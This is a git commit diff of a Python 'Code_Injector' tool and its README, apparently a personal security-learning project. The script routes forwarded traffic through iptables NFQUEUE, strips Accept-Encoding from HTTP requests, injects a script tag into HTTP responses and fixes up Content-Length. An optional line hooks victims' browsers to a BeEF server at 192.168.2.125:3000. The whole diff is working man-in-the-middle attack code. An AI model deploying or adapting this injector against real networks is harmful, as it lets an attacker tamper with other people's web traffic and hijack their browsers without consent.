d912f82afba3da54cbba9682087dc227e23b7d41
Alkım Doğan <121884935+doganalkim@users.noreply.github.com>
2024-06-20 19:59:35 +0300

    Code injector was improved

--- Code_Injector/CodeInjector.py
+++ Code_Injector/CodeInjector.py
@@ -2,80 +2,69 @@ import netfilterqueue
 import subprocess
 import scapy.all as scapy
 import re
-from scapy.layers import http
 
 Queue = None
-QueueNumb = 0
+QueueNum = 0
 
 def init_iptables():
-    # Choose 1 for testing with a different machine, and 2 for testing locally
+    # 1 is used for another macine, while 2 is for testing locally on Kali Linux
     # 1
-    #subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num',str(QueueNumb)])
+    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])
 
     # 2
-    subprocess.call(['iptables', '-I', 'INPUT',  '-j', 'NFQUEUE', '--queue-num', str(QueueNumb)])
-    subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNumb)])
+    #subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])
+    #subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])
 
 def flush_iptables():
     subprocess.call(['iptables','--flush'])
 
-def set_load(pkt,load):
+def arrange_new_pkt(pkt,load):
     pkt[scapy.Raw].load = load
-
-    del pkt[scapy.TCP].chksum
-    del pkt[scapy.IP].len
     del pkt[scapy.IP].chksum
-
-    return pkt
+    del pkt[scapy.IP].len
+    del pkt[scapy.TCP].chksum
+    return bytes(pkt)
 
 
 def process_pkt(pkt):
     scapy_pkt = scapy.IP(pkt.get_payload())
-
     if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):
-
-        loadvar = scapy_pkt[scapy.Raw].load
-        changed = False
-
+        load = scapy_pkt[scapy.Raw].load
         if scapy_pkt[scapy.TCP].dport == 80: # HTTP Request
-            print('[+] HTTP Request!')
-            # Remove the encoding to make HTML source code human readable
-            loadvar = re.sub(b'Accept-Encoding: .*?\\r\\n',b'', loadvar)
-            changed =  True
+            print('[+] HTTP Request detected!')
+            load = re.sub(b'Accept-Encoding: .*?\\r\\n',b'',load)
+            pkt.set_payload(arrange_new_pkt(scapy_pkt,load))
         elif scapy_pkt[scapy.TCP].sport == 80: # HTTP Response
-            print('[+] HTTP Response!')
-            # Inject basic JS code
-            injection_code_test = b'<script>alert("HACKED");</script>'
-            # Below is to use beef framework to hook, but I was not able to succed in other machines
-            injection_code = b'<script src="http://192.168.2.125:3000/hook.js"></script>'
-            loadvar = loadvar.replace(b'</body>',injection_code + b'</body>')
+            print('[+] HTTP Response detected!')
+            script = b'<script>alert("HACKED!");</script>'
+            # Below is for a script to be used in beef framework, change the ip address to use it on your own
+            script_for_beef = b"<script src='http://192.168.2.125:3000/hook.js'></script>"
+            #script = script_for_beef # uncomment it if you want to try for beEF framework.
+            if b'</body>' in load:
+                injection_code = b'</body>' + script
+                load = re.sub(b'</body>',injection_code,load)
+            if b'Content-Length: ' in load:
+                regex_res = re.search(b'(Content-Length: )(\d*)(\\r\\n)',load)
+                #print(regex_res.group(0)) # entire pattern
+                #print(regex_res.group(1)) # 1st paranthesis group
+                #print(regex_res.group(2)) # 2nd paranthesis group
+                #print(regex_res.group(3)) # 3rd paranthesis group
+                content_len = int(regex_res.group(2).decode()) +  len(script)
+                replaced_str = b'Content-Length: ' + str(content_len).encode() + b'\r\n'
+                load = re.sub(b'Content-Length: \d*\\r\\n',replaced_str,load)
 
-            # Arrange proper length to make attack stronger
-            content_length_search = re.search(b'(?:Content-Length:\s)(\d*)', loadvar)
-            if content_length_search and b'text/html' in loadvar:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                loadvar = load.replace( content_length, str(new_content_length).encode())
-
-            changed = True
-
-        if changed == True:
-            new_pkt = set_load(scapy_pkt, loadvar)
-            pkt.set_payload(bytes(new_pkt))
-
+            pkt.set_payload(arrange_new_pkt(scapy_pkt,load))
     pkt.accept()
-
-def arrange_queue():
-    global Queue, QueueNumb
+def init_queue():
+    global QueueNum, Queue
     Queue = netfilterqueue.NetfilterQueue()
-    Queue.bind(QueueNumb,process_pkt)
+    Queue.bind(QueueNum,process_pkt)
     Queue.run()
-
 
 if __name__ == '__main__':
     init_iptables()
     try:
-        arrange_queue()
+        init_queue()
     except KeyboardInterrupt:
-        print('[-] CTRL-C detected!')
+        print('[-] Ctrl-C detected! Flushing the iptables...')
         flush_iptables()
--- Code_Injector/README.md
+++ Code_Injector/README.md
@@ -2,6 +2,6 @@ This is a basic code injector python3 script.
 
 This site does not work agains HTTPS websites, It works against HTTP websites.
 
-Also, It does not work well for some websites for some reason I was not able to solve.
+Also, beEF script injection part does not work well for some websites for some reason I was not able to solve.
 
 The example code just injects harmless alert.
